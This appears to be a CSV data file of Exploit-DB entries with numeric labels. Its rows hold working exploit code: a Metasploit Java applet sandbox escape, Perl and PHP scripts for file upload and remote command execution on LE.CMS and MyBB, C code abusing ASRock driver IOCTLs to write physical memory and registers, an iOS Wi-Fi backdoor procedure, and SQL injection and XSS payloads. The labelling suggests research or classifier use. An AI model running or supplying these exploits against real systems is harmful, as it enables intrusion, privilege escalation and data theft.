42996,"Apple iOS 10.2 (14C92) - Remote Code Execution Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1317#c3  The exploit achieves R/W access to the host's physical memory.  This exploit has been tested on the iPhone 7, iOS 10.2 (14C92). To run the exploit against different devices or versions, the symbols must be adjusted.  The attached archive contains the following directories:   -hostapd-2.6 - A modified version of hostapd utilised in the exploit. This version of hostapd is configured to                  support 802.11k RRM, and in particular Neighbor Reports. Moreover, this version of hostapd is                  instrumented to add various commands, allowing injection and reception of crafted action frames                  used throughout the exploit.   -OneRing     - The exploit itself.  To run the exploit, you must execute the following steps:   -Connect (and enable) a SoftMAC Wi-Fi dongle to your machine (such as the TL-WN722N)   -Compile the provided version of hostapd   -Modify the ""interface"" setting under ""hostapd-2.6/hostapd/hostapd.conf"" to match your interface's name   -Configure the following settings under ""OneRing/rrm_exploit/conf.py"":     -HOSTAPD_DIR - The directory of the hostapd binary compiled above     -TARGET_MAC  - The MAC address of the device being exploited     -AP_MAC      - The MAC address of your wireless dongle     -INTERFACE   - The name of the wireless dongle's interface   -Configure the following settings under ""OneRing/conf.py"":     -TARGET_MAC  - The MAC address of the device being exploited     -TARGET_IP   - The IP address of the device being exploited   -Assemble the backdoor shellcode by running ""OneRing/rrm_exploit/assemble_backdoor.sh""   -Assemble each of the code chunks under ""OneRing/code_chunks"" by running ""compile.sh""   -Run hostapd with the configuration file provided above, broadcasting a Wi-Fi network (""test80211k"")   -Connect the target device to the network   -Run ""OneRing/attack.py""  Following the steps above should result in DART's descriptor being mapped into IO-Space, allowing R/W access to the host's physical memory. You can utilise this R/W access by calling the ""read_host_dword"" and ""write_host_dword"" functions, respectively.   Proof of Concept: https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/42996.zip",Apple,1
24904,"Java CMM - Remote Code Execution (Metasploit) ## # This file is part of the Metasploit Framework and may be subject to # redistribution and commercial restrictions. Please see the Metasploit # web site for more information on licensing and terms of use. #   http://metasploit.com/ ##  require 'msf/core' require 'rex'  class Metasploit3 < Msf::Exploit::Remote   Rank = NormalRanking    include Msf::Exploit::Remote::HttpServer::HTML   include Msf::Exploit::EXE    include Msf::Exploit::Remote::BrowserAutopwn   autopwn_info({ :javascript => false })    def initialize( info = {} )      super( update_info( info,       'Name'          => 'Java CMM Remote Code Execution',       'Description'   => %q{           This module abuses the Color Management classes from a Java Applet to run         arbitrary Java code outside of the sandbox as exploited in the wild in February         and March of 2013. The vulnerability affects Java version 7u15 and earlier and 6u41         and earlier and has been tested successfully on Windows XP SP3 and Windows 7 SP1         systems. This exploit doesn't bypass click-to-play, so the user must accept the java         warning in order to run the malicious applet.       },       'License'       => MSF_LICENSE,       'Author'        =>         [           'Unknown', # Vulnerability discovery and Exploit           'juan vazquez' # Metasploit module (just ported the published exploit)         ],       'References'    =>         [           [ 'CVE', '2013-1493' ],           [ 'OSVDB', '90737' ],           [ 'BID', '58238' ],           [ 'URL', 'https://blogs.oracle.com/security/entry/security_alert_cve_2013_1493' ],           [ 'URL', 'http://www.oracle.com/technetwork/topics/security/alert-cve-2013-1493-1915081.html' ],           [ 'URL', 'http://pastie.org/pastes/6581034' ]         ],       'Platform'      => [ 'win', 'java' ],       'Payload'       => { 'Space' => 20480, 'BadChars' => '', 'DisableNops' => true },       'Targets'       =>         [           [ 'Generic (Java Payload)',             {               'Platform' => 'java',               'Arch' => ARCH_JAVA             }           ],           [ 'Windows x86 (Native Payload)',             {               'Platform' => 'win',               'Arch' => ARCH_X86             }           ]         ],       'DefaultTarget'  => 1,       'DisclosureDate' => 'Mar 01 2013'     ))   end     def setup     path = File.join(Msf::Config.install_root, ""data"", ""exploits"", ""cve-2013-1493"", ""Init.class"")     @init_class = File.open(path, ""rb"") {|fd| fd.read(fd.stat.size) }     path = File.join(Msf::Config.install_root, ""data"", ""exploits"", ""cve-2013-1493"", ""Leak.class"")     @leak_class = File.open(path, ""rb"") {|fd| fd.read(fd.stat.size) }     path = File.join(Msf::Config.install_root, ""data"", ""exploits"", ""cve-2013-1493"", ""MyBufferedImage.class"")     @buffered_image_class = File.open(path, ""rb"") {|fd| fd.read(fd.stat.size) }     path = File.join(Msf::Config.install_root, ""data"", ""exploits"", ""cve-2013-1493"", ""MyColorSpace.class"")     @color_space_class = File.open(path, ""rb"") {|fd| fd.read(fd.stat.size) }      @init_class_name = rand_text_alpha(""Init"".length)     @init_class.gsub!(""Init"", @init_class_name)     super   end    def on_request_uri(cli, request)     print_status(""handling request for #{request.uri}"")      case request.uri     when /\.jar$/i       jar = payload.encoded_jar       jar.add_file(""#{@init_class_name}.class"", @init_class)       jar.add_file(""Leak.class"", @leak_class)       jar.add_file(""MyBufferedImage.class"", @buffered_image_class)       jar.add_file(""MyColorSpace.class"", @color_space_class)       metasploit_str = rand_text_alpha(""metasploit"".length)       payload_str = rand_text_alpha(""payload"".length)       jar.entries.each { |entry|         entry.name.gsub!(""metasploit"", metasploit_str)         entry.name.gsub!(""Payload"", payload_str)         entry.data = entry.data.gsub(""metasploit"", metasploit_str)         entry.data = entry.data.gsub(""Payload"", payload_str)       }       jar.build_manifest        send_response(cli, jar, { 'Content-Type' => ""application/octet-stream"" })     when /\/$/       payload = regenerate_payload(cli)       if not payload         print_error(""Failed to generate the payload."")         send_not_found(cli)         return       end       send_response_html(cli, generate_html, { 'Content-Type' => 'text/html' })     else       send_redirect(cli, get_resource() + '/', '')     end    end    def generate_html     html  = %Q|<html><head><title>Loading, Please Wait...</title></head>|     html += %Q|<body><center><p>Loading, Please Wait...</p></center>|     html += %Q|<applet archive=""#{rand_text_alpha(8)}.jar"" code=""#{@init_class_name}.class"" width=""1"" height=""1"">|     html += %Q|</applet></body></html>|     return html   end  end",Java,0
28745,osCommerce 2.2 - '/admin/countries.php?page' Cross-Site Scripting source: https://www.securityfocus.com/bid/20343/info    osCommerce is prone to multiple cross-site scripting vulnerabilities.    An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.    http://www.example.com/catalog/admin/countries.php?page=1[XSS-code],oscommerce,1
5887,"LE.CMS 1.4 - Arbitrary File Upload #!/usr/bin/perl  use strict; use warnings; use LWP::UserAgent; use HTTP::Request::Common;  print <<INTRO; - - - - - - - - - - - - - - - - - - - - - - - - - - - - - LE.CMS <= 1.4 Remote Arbitrary File Upload Exploit  - -                                                     -  -                                                   -    -        Discovered && Coded By: t0pP8uZz         -        -          Discovered On: 19 JUNE 2008          -    -                                               -   -     Script Download: http://worldlevel.com      -  -   milw0rm.com, h4ck-y0u.org, CiperCrew, offsec    -  -                                                   - - LE.CMS suffers from a arbitrary file upload vuln..  - - .. this exploit will upload any file to the server  - - - - - - - - - - - - - - - - - - - - - - - - - - - - - INTRO  print ""\nEnter Target URL(ie: http://site.com): "";     chomp(my $host=<STDIN>);      print ""\nEnter Local File Path To Upload(ie: C:\\file.txt): "";     chomp(my $file=<STDIN>);  my $ext   = substr $file, rindex $file, '.'; my $fname = int rand 9999; my $ua    = LWP::UserAgent->new( agent => 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)', cookie_jar => {} );  my $re = $ua->request(POST $host . '/cms/admin/upload.php',                         Content_Type =>   'form-data',                         Content      => [ 'submit0'  => 'authed', # if script reads this as TRUE then the script thinks we have already authenticated the username/password, only 0 or undef is false                                           'submit'   => 1,                                            'password' => 1, # as long as this is true we should be able to upload                                           'filename' => $fname,                                           'upload'   => [ $file ] ] );  die ""Exploit Failed, HTTP Request Failed!"" unless $re->is_success;  print ""File Uploaded! Location: "" . $host . ""/cms/images/"" . $fname . $ext . ""\n""; exit;  # milw0rm.com [2008-06-21]",LE.CMS,0
45716,"ASRock Drivers - Privilege Escalation SecureAuth - SecureAuth Labs Advisory http://www.secureauth.com/  ASRock Drivers Elevation of Privilege Vulnerabilities  1. *Advisory Information*  Title: ASRock Drivers Elevation of Privilege Vulnerabilities Advisory ID: CORE-2018-0005 Advisory URL: https://www.secureauth.com/labs/advisories/asrock-drivers-elevation-privilege-vulnerabilities Date published: 2018-10-25 Date of last update: 2018-10-25 Vendors contacted: ASRock Release mode: Coordinated release  2. *Vulnerability Information*  Class: Exposed IOCTL with Insufficient Access Control [CWE-782], Exposed IOCTL with Insufficient Access Control [CWE-782], Exposed IOCTL with Insufficient Access Control [CWE-782], Exposed IOCTL with Insufficient Access Control [CWE-782] Impact: Code execution Remotely Exploitable: No Locally Exploitable: Yes CVE Name: CVE-2018-10709, CVE-2018-10710, CVE-2018-10711, CVE-2018-10712  3. *Vulnerability Description*  ASRock's website states that [1]:  ASRock Inc. is established in 2002, specialized in the field of motherboards. With the 3C design concept, Creativity, Consideration, Cost-effectiveness, the company explores the limit of motherboards manufacturing while paying attention on the eco issue at the same time, developing products with the consideration of eco-friendly concept. ASRock has been growing fast and become world third largest motherboard brand with headquarter in Taipei, Taiwan and branches in Europe and the USA.  ASRock offers several utilities designed to give the user with an ASRock motherboard more control over certain settings and functions. These utilities include various features like the RGB LED control, hardware monitor, fan controls, and overclocking/voltage options.  Multiple vulnerabilities were found in AsrDrv101.sys and AsrDrv102.sys low level drivers, installed by ASRock RGBLED and other ASRock branded utilities, which could allow a local attacker to elevate privileges.  4. *Vulnerable Packages*     . ASRock RGBLED before v1.0.35.1    . A-Tuning before v3.0.210    . F-Stream before v3.0.210    . RestartToUEFI before v1.0.6.2  5. *Vendor Information, Solutions and Workarounds*  ASRock published the following fixed applications for each of its motherboards models:     . ASRock RGBLED v1.0.36    . A-Tuning v3.0.216    . F-Stream v3.0.216    . RestartToUEFI v1.0.7  Downloads are available on the ASRock website.  6. *Credits*  These vulnerabilities were discovered and researched by Diego Juarez. The publication of this advisory was coordinated by Leandro Cuozzo from SecureAuth Advisories Team.  7. *Technical Description / Proof of Concept Code*  ASRock's RBGLED, A-Tuning, F-Stream, RestartToUEFI, and possibly others, use a low level driver to program and query the status on embedded ICs on their hardware. Fan curves, clock frequencies, LED colors, thermal performance, and other user customizable properties and monitoring functionality are exposed to applications through this low level kernel driver.  The main subjects of this advisory are the device drivers installed/loaded by these utilities (AsrDrv101.sys and ArsDrv102.sys). >From now on addressed as ""AsrDrv"". Default installation allows non-privileged user processes (even running at LOW INTEGRITY) to get a HANDLE and issue IOCTL codes to the driver.  The following sections describe the problems found.  7.1. *CR register access*  [CVE-2018-10709]  AsrDrv exposes functionality to read and write CR register values. This could be leveraged in a number of ways to ultimately run code with elevated privileges.  /----- // Asrock RGBLED PoC demonstrating non-privileged access to CR registers  #include <windows.h> #include <stdio.h>  #define IOCTL_ASROCK_READCR 0x22286C #define IOCTL_ASROCK_WRITECR 0x222870  HANDLE ghDriver = 0;  #pragma pack (push,1)  typedef struct _ASROCK_CR_STRUCT {     ULONG64 reg;     ULONG64 value; } ASROCK_CR_STRUCT;  #pragma pack(pop)  #define IOCTLMACRO(iocontrolcode, size) \     ULONG64 outbuffer[2] = { 0 };    \     DWORD returned = 0;    \     DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);    \     return outbuffer[1];    \  ULONG64 ASROCK_ReadCR(DWORD reg) {     ASROCK_CR_STRUCT  inbuffer = { 3, 0};     IOCTLMACRO(IOCTL_ASROCK_READCR, 10) }  ULONG64 ASROCK_WriteCR(DWORD reg, ULONG64 value) {     ASROCK_CR_STRUCT  inbuffer = { reg, value};     IOCTLMACRO(IOCTL_ASROCK_WRITECR, 10) }  BOOL InitDriver() {     char szDeviceName[] = ""\\\\.\\AsrDrv101"";     ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);      if (ghDriver == INVALID_HANDLE_VALUE) {         printf(""Cannot get handle to driver object \'%s\'- GetLastError:%d\n"", szDeviceName, GetLastError());         return FALSE;     }     return TRUE; }  int main(int argc, char* argv[]) {     printf(""Asrock RGBLED PoC (CR access) - pnx!/CORE\n"");      if (!InitDriver()) {         printf(""InitDriver failed! - aborting...\n"");         exit(0);     }      ULONG64 a = ASROCK_ReadCR(3);     printf(""CR3 (PageDir): %llx\n"", a);     printf(""press ENTER for instant system CRASH\n"");     getchar();      a = ASROCK_WriteCR(3, 0xffff1111ffff2222);      CloseHandle(ghDriver); } -----/  7.2. *Arbitrary physical memory read/write*  [CVE-2018-10710]  AsrDrv's IOCTL code 0x22280C exposes a functionality to read and write arbitrary physical memory, this could be leveraged by a local attacker to elevate privileges.  Proof of Concept:  /----- // Asrock RGBLED PoC (arbitrary physical memory write) // This PoC demonstrates arbitrary write to physical memory.  #include <windows.h> #include <stdio.h>  #define IOCTL_ASROCK_WRITEPH 0x22280C  HANDLE ghDriver = 0;  #pragma pack (push,1)  typedef struct _ASROCK_PH_STRUCT {     ULONG64 destPhysical;     DWORD size;     DWORD unk0;     ULONG64 src; } ASROCK_PH_STRUCT;  #pragma pack(pop)  BOOL ASROCK_ph_memcpy(ULONG64 dest, ULONG64 src, DWORD size) {     ASROCK_PH_STRUCT mystructIn = { dest, size, 0, src};      BYTE outbuffer[0x30] = { 0 };      DWORD returned = 0;     DeviceIoControl(ghDriver, IOCTL_ASROCK_WRITEPH, (LPVOID)&mystructIn, sizeof(mystructIn), (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);     if (returned) {         return TRUE;     }     return FALSE; }  BOOL InitDriver() {     char szDeviceName[] = ""\\\\.\\AsrDrv101"";     ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);      if (ghDriver == INVALID_HANDLE_VALUE) {         printf(""Cannot get handle to driver \'%s\'- GetLastError:%d\n"", szDeviceName, GetLastError());         return FALSE;     }     return TRUE; }  int main(int argc, char * argv[]) {     printf(""Asrock RGBLED PoC (arbitrary physical memory write) - pnx!/CORE\n"");     if (!InitDriver()) {         exit(0);     }      printf(""press ENTER for SYSTEM CRASH\n"");     getchar();     ULONG64 data = 0xFFFF1111FFFF2222;     for (unsigned int i = 0; i < 0xffffffff; i += 0x1000) {         printf(""."");         ASROCK_ph_memcpy(i, (ULONG64)&data, 8);     }      CloseHandle(ghDriver);     return 0; } -----/  7.3. *MSR Register access*  [CVE-2018-10711]  AsrDrv exposes functionality to read and write Machine Specific Registers (MSRs). This could be leveraged to execute arbitrary ring-0 code.  Proof of Concept:  /----- // Asrock RGBLED PoC demonstrating non-privileged access to MSR registers  // This PoC demonstrates non privileged MSR access by reading // IA32_LSTAR value (leaks a kernel function pointer bypassing KASLR) // and then writing garbage to it (instant BSOD!)  #include <windows.h> #include <stdio.h>  #define IOCTL_ASROCK_RDMSR 0x222848 #define IOCTL_ASROCK_WRMSR 0x22284C  HANDLE ghDriver = 0;  #pragma pack (push,1)  typedef struct _ASROCK_MSRIO_STRUCT {     ULONG64 valLO;            //     DWORD reg;            //     ULONG64 valHI;        // } ASROCK_MSRIO_STRUCT;  #pragma pack(pop)  #define IOCTLMACRO(iocontrolcode, size) \     ASROCK_MSRIO_STRUCT outbuffer = { 0 };\     DWORD returned = 0;    \     DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)&outbuffer, sizeof(outbuffer), &returned, NULL);    \     return (outbuffer.valHI<<0x20 | outbuffer.valLO);    \  ULONG64 GIO_RDMSR(DWORD reg) {     ASROCK_MSRIO_STRUCT inbuffer = { 0, reg };     IOCTLMACRO(IOCTL_ASROCK_RDMSR, 20) }  ULONG64 GIO_WRMSR(DWORD reg, ULONG64 value) {     ASROCK_MSRIO_STRUCT inbuffer = { value & 0xffffffff, reg, (value & 0xffffffff00000000)>>0x20 };     IOCTLMACRO(IOCTL_ASROCK_WRMSR, 20) }  BOOL InitDriver() {     char szDeviceName[] = ""\\\\.\\AsrDrv101"";     ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);      if (ghDriver == INVALID_HANDLE_VALUE) {         printf(""Cannot get handle to driver object \'%s\'- GetLastError:%d\n"", szDeviceName, GetLastError());         return FALSE;     }     return TRUE; }  int main(int argc, char * argv[]) {     printf(""Asrock RGBLED PoC (MSR access) - pnx!/CORE\n"");      if (!InitDriver()) {         printf(""InitDriver failed! - aborting...\n"");         exit(0);     }      ULONG64 a = GIO_RDMSR(0xC0000082);     printf(""IA322_LSTAR: %llx (nt!KiSystemCall64)\n"", a);     printf(""press ENTER for instant BSOD\n"");     getchar();      a = GIO_WRMSR(0xC0000082, 0xffff1111ffff2222);     return (int)CloseHandle(ghDriver); } -----/  7.4. *Port mapped I/O access*  [CVE-2018-10712]  AsrDrv exposes functionality to read/write data from/to IO ports. This could be leveraged in a number of ways to ultimately run code with elevated privileges.  /----- // Asrock RGBLED PoC demonstrating non-privileged access to IO ports  #include <windows.h> #include <stdio.h>  #define IOCTL_ASROCK_PORTREADB 0x222810 #define IOCTL_ASROCK_PORTWRITEB 0x222814  HANDLE ghDriver = 0;  #pragma pack (push,1)  typedef struct _ASROCK_CR_STRUCT {     DWORD port;     ULONG64 value; } ASROCK_CR_STRUCT;  #pragma pack(pop)  #define IOCTLMACRO(iocontrolcode, size) \     BYTE outbuffer[0x10] = { 0 };    \     DWORD returned = 0;    \     DeviceIoControl(ghDriver, ##iocontrolcode##, (LPVOID)&inbuffer, ##size##, (LPVOID)outbuffer, sizeof(outbuffer), &returned, NULL);    \     return outbuffer[1];    \  BYTE ASROCK_ReadPortB(DWORD port) {     ASROCK_CR_STRUCT  inbuffer = { port, 0};     IOCTLMACRO(IOCTL_ASROCK_PORTREADB, 10) }  BYTE ASROCK_WritePortB(DWORD port, ULONG64 value) {     ASROCK_CR_STRUCT  inbuffer = { port, value};     IOCTLMACRO(IOCTL_ASROCK_PORTWRITEB, 10) }  void Reboot() {     BYTE cf9 = ASROCK_ReadPortB(0xcf9) & ~0x6;     ASROCK_WritePortB(0xcf9, cf9 | 2);     Sleep(50);     ASROCK_WritePortB(0xcf9, cf9 | 0xe);     Sleep(50); }  BOOL InitDriver() {     char szDeviceName[] = ""\\\\.\\AsrDrv101"";     ghDriver = CreateFile(szDeviceName, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);      if (ghDriver == INVALID_HANDLE_VALUE) {         printf(""Cannot get handle to driver object \'%s\'- GetLastError:%d\n"", szDeviceName, GetLastError());         return FALSE;     }     return TRUE; }  int main(int argc, char * argv[]) {     printf(""Asrock RGBLED PoC (PMIO access) - pnx!/CORE\n"");      if (!InitDriver()) {         printf(""InitDriver failed! - aborting...\n"");         exit(0);     }      Reboot();     return (int)CloseHandle(ghDriver); } -----/  8. *Report Timeline* 2018-03-12: SecureAuth sent an initial notification to ASRock America Support. 2018-03-13: ASRock confirmed the receipt and requested additional information in order to send it to its HQ. 2018-03-13: SecureAuth answered saying that a draft advisory has been written, including a technical description, and requested for PGP keys in order to send it encrypted. 2018-03-14: ASRock answered asking for the advisory in clear text. 2018-03-14: SecureAuth sent the draft advisory to ASRock in clear text form. 2018-03-14: ASRock confirmed the receipt and informed they would submit it to the HQ for validation. 2018-03-23: SecureAuth requested a status update on the case. 2018-03-23: ASRock answered saying they didn't have a reply from HQ. 2018-03-26: ASRock notified SecureAuth they were still checking the reported vulnerabilities and requested additional time. 2018-03-27: SecureAuth thanked the status update and informed ASRock that would be in contact the following week. 2018-03-28: ASRock informed SecureAuth they checked the reported vulnerabilities and they would have a preliminary schedule for the fix at the end of April. 2018-03-28: SecureAuth thanked ASRock's reply. 2018-04-20: ASRock notified that the driver was modified and sent to SecureAuth the fixed applications and requested for a feedback. 2018-04-23: SecureAuth acknowledged the reception of the fixed applications. 2018-05-09: SecureAuth tested the modified driver and verified that the issues detailed in the proofs of concept were solved. For that reason, SecureAuth propose release date to be May 23rd. 2018-05-09: ASRock thanked SecureAuth's update and forwarded the proposal to its HQ for a confirmation. 2018-05-15: ASRock notified SecureAuth that they were going to deploy the new driver architecture into each ASRock utility. For the whole project, ASRock estimated to finish by the end of June. 2018-05-15: SecureAuth thanked ASRock's update and asked if ASRock had planned to release a security note. 2018-05-23: ASRock informed that each utility would include a release note with a security description. 2018-06-15: SecureAuth requested ASRock a status update about its timescale. 2018-06-09: ASRock forwarded the request to its HQ. 2018-06-19: ASRock informed that they had started to upload the fixed drivers for one of the supported motherboard series and they were going to continue uploading the drivers for other models. 2018-07-11: SecureAuth requested ASRock a status update. 2018-07-11: ASRock replied saying they were still working on the upload process. 2018-08-06: SecureAuth requested ASRock a new status update. 2018-08-16: ASRock notified SecureAuth they had finished with the update process. 2018-10-17: SecureAuth set October 25th as the publication date. 2018-10-25: Advisory CORE-2018-0005 published.  9. *References*  [1] http://www.asrock.com/  10. *About SecureAuth Labs*  SecureAuth Labs, the research arm of SecureAuth Corporation, is charged with anticipating the future needs and requirements for information security technologies. We conduct research in several important areas of computer security, including identity-related attacks, system vulnerabilities and cyber-attack planning. Research includes problem formalization, identification of vulnerabilities, novel solutions and prototypes for new technologies. We regularly publish security advisories, primary research, technical publications, research blogs, project information, and shared software tools for public use at http://www.secureauth.com.  11. *About SecureAuth*  SecureAuth is leveraged by leading companies, their employees, their customers and their partners to eliminate identity-related breaches. As a leader in access management, identity governance, and penetration testing, SecureAuth is powering an identity security revolution by enabling people and devices to intelligently and adaptively access systems and data, while effectively keeping bad actors from doing harm. By ensuring the continuous assessment of risk and enablement of trust, SecureAuth's highly flexible Identity Security Automation (ISA) platform makes it easier for organizations to prevent the misuse of credentials and exponentially reduce the enterprise threat surface. To learn more, visit www.secureauth.com<http://www.secureauth.com>, call (949) 777-6959, or email us at info@secureauth.com<mailto:info@secureauth.com>  12. *Disclaimer*  The contents of this advisory are copyright (c) 2018 SecureAuth, and are licensed under a Creative Commons Attribution Non-Commercial Share-Alike 3.0 (United States) License: http://creativecommons.org/licenses/by-nc-sa/3.0/us/",.secureauth.,1
4857,"OneCMS 2.4 - SQL Injection / Upload ########################## WwW.BugReport.ir ######################### # #      AmnPardaz Security Research Team # # Title: OneCMS Vulnerabilities # Vendor: http://www.insanevisions.com # Bugs: SQL Injection (Authentication bypass) , Arbitrary file upload! # Vulnerable Version: 2.4 (prior versions also may be affected) # Exploitation: Remote with browser # Fix Available: No! ################################################################   #################### - Description: ####################  quote from vendor: ""OneCMS is an Open Source CMS also released under GPL allowing users to run there own game site easily.  From the powerful template system to top-notch support, OneCMS is a great option for gaming sites.""   #################### - Vulnerability: ####################  +-->Multiple SQL Injection vulnerabilities (authentication bypass)  Code Snippet: a_login.php Line#5-12  if ($_GET['login'] == ""yes"") {  $usernameb = strip_tags(stripcslashes($_POST['username'])); $passwordc = $_POST['password'];  $passwordb = md5($passwordc);  $sql = mysql_query(""SELECT * FROM onecms_users WHERE username = '"".$usernameb.""' AND password = '"".$passwordb.""'""); $login_check = mysql_num_rows($sql);  $usernameb is prone to sql injection vulnerability therefore its possible for a remote attacker to bypass login form regardless of magic quotes setting!  POC : Username: admin' or 1=1 /* Password: something  afterward program redirects user to another location via header() and so (this behavior makes an infinite loop condition) but still its possible to do administration tasks such as file upload!  ------------------------------------ Code Snippet: staff.php Line#30-31  $result = mysql_query(""SELECT * FROM onecms_profile WHERE username = '"".$_GET['user'].""'""); $profile = mysql_fetch_row($result);  POC: http://localhost/OneCMS_v2.4/staff.php?user=aaa' union select 1,username,password,1,1,1,1,1,1,1,1,1,1 from onecms_users/* condition: magic_quotes_gpc = Off  +--> Arbitrary file upload!  Code Snippet: a_upload.php Line#472-475  if ($_FILES[""ss_$i""][""name""]) { if (((((($_FILES[""ss_$i""][""type""] == ""image/jpeg"") or ($_FILES[""ss_$i""][""type""] == ""image/gif"") or ($_FILES[""ss_$i""][""type""] == ""image/bmp"") or ($_FILES[""ss_$i""][""type""] == ""image/png"") && ($_FILES[""ss_$i""][""type""])))))) {  copy ($_FILES[""ss_$i""][""tmp_name""], ""$path/"".$_FILES[""ss_$i""][""name""]."""");  As shown above Its possible to upload arbitrary files (ex: .php) with image/gif content type as a valid image file!   POC: POST /OneCMS_v2.4/a_upload.php?view=add2 HTTP/1.0 Cookie: username=admin'or 1=1/*; password=96e79218965eb72c92a549dd5a330112; login_date=1199693273; style=Trend  -----------------------------7d84115025c Content-Disposition: form-data; name=""ss_1""; filename=""C:\path\to\file\test.php"" Content-Type: image/gif  <? phpinfo(); ?> -----------------------------7d84115025c Content-Disposition: form-data; name=""ss2_1""   -----------------------------7d84115025c Content-Disposition: form-data; name=""type_1""  image -----------------------------7d84115025c Content-Disposition: form-data; name=""muche""  1 -----------------------------7d84115025c Content-Disposition: form-data; name=""Submit""  Upload -----------------------------7d84115025c--   #################### - Credit : #################### Original Advisory: http://www.bugreport.ir/?/26 AmnPardaz Security Research Team Contact: admin[4t}bugreport{d0t]ir WwW.BugReport.ir WwW.AmnPardaz.com  # milw0rm.com [2008-01-07]",.insanevisions.,1
4927,"MyBulletinBoard (MyBB) 1.2.10 - Remote Code Execution #!/usr/bin/php -q -d short_open_tag=on <?php  // magic_quotes_gpc needs to be off  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  if ($argc<5) { print ""-------------------------------------------------------------------------\r\n""; print ""                 MyBB <= 1.2.10 Remote Code Execution Exploit\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""Usage: w4ck1ng_mybb.php [HOST] [PATH] [FORUM_ID] [COMMAND]\r\n\r\n""; print ""[HOST] 	  = Target server's hostname or ip address\r\n""; print ""[PATH] 	  = Path where MyBB is located\r\n""; print ""[FORUM_ID] = Valid forum ID\r\n""; print ""[COMMAND]  = Command to execute\r\n\r\n""; print ""e.g. w4ck1ng_mybb.php victim.com /mybb/ 1 id\r\n""; print ""-------------------------------------------------------------------------\r\n""; print ""            		 http://www.w4ck1ng.com\r\n""; print ""            		        ...Silentz\r\n""; print ""-------------------------------------------------------------------------\r\n""; die; }  //Props to rgod for the following functions  $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacketii($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); }  function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host = $argv[1]; $path = $argv[2]; $fid  = $argv[3]; $cmd  = $argv[4]; $cmd  = urlencode($cmd); $port=80;$proxy="""";  if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;} if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}      $sql = ""forumdisplay.php?fid=$fid&sortby=']=1;echo%20'*';%20system('$cmd');echo%20'*';%20\$orderarrow['"";     $packet =""GET "" . $path . $sql . "" HTTP/1.1\r\n"";     $packet.=""Host: "".$host.""\r\n"";     $packet.=""User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; .NET CLR 2.0.50727;)\r\n"";     $packet.=""Connection: Close\r\n\r\n"";     sendpacketii($packet);       $temp=explode(""*"",$html);      $temp2=explode(""*"",$temp[1]);      print ""-------------------------------------------------------------------------\r\n"";     print ""                MyBB <= 1.2.10 Remote Code Execution Exploit\r\n"";         print ""-------------------------------------------------------------------------\r\n"";     echo  $temp2[0];     print ""-------------------------------------------------------------------------\r\n"";     print ""                          http://www.w4ck1ng.com\r\n"";     print ""                                 ...Silentz\r\n"";     print ""-------------------------------------------------------------------------\r\n"";   ?>  # milw0rm.com [2008-01-16]",.w4ck1ng.,1
12484,GuppY 4.5.18 - Blind SQL Injection / XPath Injection ========================================================================================                   | # Title    : GuppY v4.5.18 Blind SQL/XPath injection Vulnerability    | # Author   : indoushka                                                                | # email    : indoushka@hotmail.com | # Dork     : Site créé avec GuppY v4.5.18 © | # Tested on: windows SP2 Français V.(Pnx2 2.0)         | # Bug      : SQL     | # Download : http://www.toocharger.com/telecharger/scripts/guppy/3717.htm ======================      Exploit By indoushka       ================================= # Exploit  :    1 - http://127.0.0.1/guppy/newsletter.php?lng=fr+and+2137718188-60=0+--+  Dz-Ghost Team ===== Saoucha * Star08 * Redda * theblind74 * XproratiX * onurozkan * n2n * Meher Assel ==================== Greetz : Exploit-db Team all my friend : His0k4 * Hussin-X * Rafik (www.Tinjah.com) * Yashar (www.sc0rpion.ir) SoldierOfAllah (www.m4r0c-s3curity.cc) Stake (www.v4-team.com) * r1z (www.sec-r1z.com) * D4NB4R http://www.ilegalintrusion.net/foro/ www.sa-hacker.com *  www.alkrsan.net * www.mormoroth.net * MR.SoOoFe * ThE g0bL!N -----------------------------------------------------------------------------------------------------------------------,.toocharger.,1
